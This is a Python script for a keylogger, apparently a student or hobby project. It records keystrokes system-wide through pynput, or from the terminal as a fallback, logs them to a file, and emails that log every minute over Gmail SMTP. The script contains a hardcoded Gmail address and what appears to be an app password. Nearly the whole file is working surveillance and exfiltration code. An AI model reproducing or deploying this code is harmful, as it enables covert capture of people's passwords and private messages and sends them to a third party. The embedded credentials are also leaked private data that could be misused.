#!/usr/bin/env python3

import smtplib
import os
import time
import threading
import signal
import atexit
import datetime
import sys

# ──────────────────────────────────────────────────────────────────────────────
# IMPORTANT: add this import so EmailMessage is defined
from email.message import EmailMessage
# ──────────────────────────────────────────────────────────────────────────────

# For system-wide keyboard monitoring
try:
    from pynput import keyboard
    USING_PYNPUT = True
except ImportError:
    print("pynput not available, falling back to terminal input mode")
    import termios
    import tty
    USING_PYNPUT = False

# ----------------------------
# Configuration
# ----------------------------

# Absolute path to the keystrokes file
FILE_PATH = '/workspaces/Keyloggers/keystrokes.txt'

# How often to send email (in seconds)
SEND_INTERVAL_SECONDS = 60  # 1 minute

# SMTP server settings
SMTP_SERVER   = 'smtp.gmail.com'         # e.g. 'smtp.gmail.com' for Gmail
SMTP_PORT     = 587                      # 587 for STARTTLS
SMTP_USERNAME = 'rai230404@gmail.com'    # your SMTP username
SMTP_PASSWORD = 'wauj josb nkwz qlnc'    # your SMTP app-specific password

# Recipient email address
RECIPIENT_EMAIL = 'rai230404@gmail.com'


# ----------------------------
# Globals and buffers
# ----------------------------

# Buffer to store keystrokes before writing to file
keystroke_buffer = []
buffer_lock = threading.Lock()
last_write_time = time.time()

# For detecting "END" sequence
end_sequence = []
running = True


# ----------------------------
# Utility functions
# ----------------------------

def get_timestamp():
    """Return current timestamp in a readable format."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def write_buffer_to_file():
    """Write the buffered keystrokes to file in horizontal format."""
    global keystroke_buffer

    with buffer_lock:
        if keystroke_buffer:
            timestamp = get_timestamp()
            keystroke_text = "".join(keystroke_buffer)
            # Ensure directory exists
            os.makedirs(os.path.dirname(FILE_PATH), exist_ok=True)
            with open(FILE_PATH, "a") as f:
                f.write(f"{timestamp}: {keystroke_text}\n")
            keystroke_buffer = []


def check_end_sequence():
    """Check if the last three characters are 'END' (case-insensitive)."""
    global end_sequence, running

    if len(end_sequence) >= 3:
        last_three = ''.join(end_sequence[-3:]).upper()
        if last_three == "END":
            running = False
            return True
    return False


def buffer_keystroke(key_char):
    """Add keystroke to buffer and print it to the terminal."""
    global keystroke_buffer, last_write_time, end_sequence

    with buffer_lock:
        # Regular single-character keys
        if isinstance(key_char, str) and len(key_char) == 1:
            keystroke_buffer.append(key_char)
            end_sequence.append(key_char)
            print(key_char, end='', flush=True)

        else:
            # Special keys
            if key_char == "SPACE":
                keystroke_buffer.append(" ")
                end_sequence.append(" ")
                print(" ", end='', flush=True)

            elif key_char == "ENTER":
                keystroke_buffer.append("\n")
                end_sequence.append("\n")
                print("\n", end='', flush=True)

            elif key_char == "TAB":
                keystroke_buffer.append("\t")
                end_sequence.append("\t")
                print("\t", end='', flush=True)

            elif key_char == "BACKSPACE":
                if keystroke_buffer:
                    keystroke_buffer.pop()
                if end_sequence:
                    end_sequence.pop()
                # Move cursor back, overwrite with space, move back again
                sys.stdout.write('\b \b')
                sys.stdout.flush()

            else:
                # Show other special keys in brackets
                representation = f"[{key_char}]"
                keystroke_buffer.append(representation)
                # Do not count these toward the "END" sequence
                end_sequence.append('')
                print(representation, end='', flush=True)

    check_end_sequence()

    # Periodically flush buffer to file every 10 seconds
    current_time = time.time()
    if current_time - last_write_time >= 10:
        write_buffer_to_file()
        last_write_time = current_time


# ----------------------------
# Email-sending functions
# ----------------------------

def send_keystrokes(file_path: str, recipient: str) -> None:
    """
    Reads the keystrokes file at file_path and emails it to recipient.
    """
    if not os.path.isfile(file_path):
        print(f"\n❌  File not found: {file_path}")
        return

    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Keystrokes Log'
    msg['From'] = SMTP_USERNAME
    msg['To'] = recipient
    msg.set_content('Attached is the latest keystrokes log.')

    with open(file_path, 'rb') as f:
        data = f.read()
    filename = os.path.basename(file_path)
    msg.add_attachment(
        data,
        maintype='text',
        subtype='plain',
        filename=filename
    )

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.ehlo()
            server.starttls()
            server.login(SMTP_USERNAME, SMTP_PASSWORD)
            server.send_message(msg)
        print(f"\n✔️  Sent '{filename}' to {recipient}")
    except Exception as e:
        print(f"\n❌  Failed to send email: {e}")


def email_loop():
    """Thread function to send the keystrokes file every SEND_INTERVAL_SECONDS."""
    # Optionally send once immediately
    send_keystrokes(FILE_PATH, RECIPIENT_EMAIL)
    while running:
        time.sleep(SEND_INTERVAL_SECONDS)
        if not running:
            break
        send_keystrokes(FILE_PATH, RECIPIENT_EMAIL)


# ----------------------------
# Keylogger callbacks
# ----------------------------

def on_press(key):
    """Handler for key press events using pynput."""
    global running

    if not running:
        return False  # Stop listener

    try:
        key_char = key.char
        buffer_keystroke(key_char)
    except AttributeError:
        key_name = str(key).replace("Key.", "")
        if key == keyboard.Key.space:
            buffer_keystroke("SPACE")
        elif key == keyboard.Key.enter:
            buffer_keystroke("ENTER")
        elif key == keyboard.Key.tab:
            buffer_keystroke("TAB")
        elif key == keyboard.Key.backspace:
            buffer_keystroke("BACKSPACE")
        else:
            buffer_keystroke(key_name)

    return running  # Continue if running is True


def get_char():
    """Get a single character from standard input."""
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch


# ----------------------------
# Cleanup and signal handling
# ----------------------------

def cleanup():
    """Clean up before exiting: write remaining buffer, log stop."""
    write_buffer_to_file()
    os.makedirs(os.path.dirname(FILE_PATH), exist_ok=True)
    with open(FILE_PATH, "a") as f:
        f.write(f"{get_timestamp()}: [INFO] Keylogger stopped\n")
    print(f"\nKeylogger stopped. Log saved to {FILE_PATH}")


def signal_handler(sig, frame):
    global running
    running = False
    cleanup()
    if not USING_PYNPUT:
        sys.exit(0)


def timer_write_buffer():
    """Ensure buffer is written to file every 10 seconds."""
    global running, last_write_time
    while running:
        time.sleep(10)
        write_buffer_to_file()
        last_write_time = time.time()


# ----------------------------
# Main functions
# ----------------------------

def main_pynput():
    """Main function using pynput for system-wide monitoring."""
    # Create log file with header
    os.makedirs(os.path.dirname(FILE_PATH), exist_ok=True)
    with open(FILE_PATH, "w") as f:
        f.write(f"=== System-wide Keylogger Started {get_timestamp()} ===\n")

    print(f"Keylogger started. Logging to {FILE_PATH}")
    print("Type 'END' to stop the keylogger.")
    print("Keystrokes will be shown here and saved every 10 seconds.")

    # Start timer thread to flush buffer periodically
    timer_thread = threading.Thread(target=timer_write_buffer, daemon=True)
    timer_thread.start()

    # Start email-sending thread
    email_thread = threading.Thread(target=email_loop, daemon=True)
    email_thread.start()

    # Start listening for keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # Final cleanup
    cleanup()


def main_terminal():
    """Main function using terminal input (fallback)."""
    # Save original terminal settings
    fd = sys.stdin.fileno()
    original_terminal_settings = termios.tcgetattr(fd)

    # Register cleanup and signal handler
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)

    # Create log file with header
    os.makedirs(os.path.dirname(FILE_PATH), exist_ok=True)
    with open(FILE_PATH, "w") as f:
        f.write(f"=== Terminal Keylogger Started {get_timestamp()} ===\n")

    print(f"Keylogger started. Logging to {FILE_PATH}")
    print("Type 'END' to stop the keylogger.")
    print("Note: This will only capture keystrokes while this terminal window is in focus.")
    print("Keystrokes will be shown here and saved every 10 seconds.")

    # Start timer thread to flush buffer periodically
    timer_thread = threading.Thread(target=timer_write_buffer, daemon=True)
    timer_thread.start()

    # Start email-sending thread
    email_thread = threading.Thread(target=email_loop, daemon=True)
    email_thread.start()

    # Start capturing keystrokes
    while running:
        char = get_char()
        char_code = ord(char)
        if char_code < 32 or char_code == 127:
            char_name = {
                27: 'ESC',
                9: 'TAB',
                13: 'ENTER',
                127: 'BACKSPACE',
                8: 'BACKSPACE',
                32: 'SPACE'
            }.get(char_code, f"CTRL+{chr(char_code + 64)}")
            buffer_keystroke(char_name)
        else:
            buffer_keystroke(char)

        # Exit if END was typed
        if not running:
            break

    # Restore terminal settings if needed
    termios.tcsetattr(fd, termios.TCSADRAIN, original_terminal_settings)
    cleanup()


if __name__ == "__main__":
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)

    if USING_PYNPUT:
        main_pynput()
    else:
        # Ensure we're running in a TTY for terminal capture
        if not sys.stdin.isatty():
            print("This script must be run in a terminal.")
            sys.exit(1)
        # Ensure termios is available
        if 'termios' not in globals():
            print("This script requires a UNIX-like environment with termios support.")
            sys.exit(1)
        main_terminal()
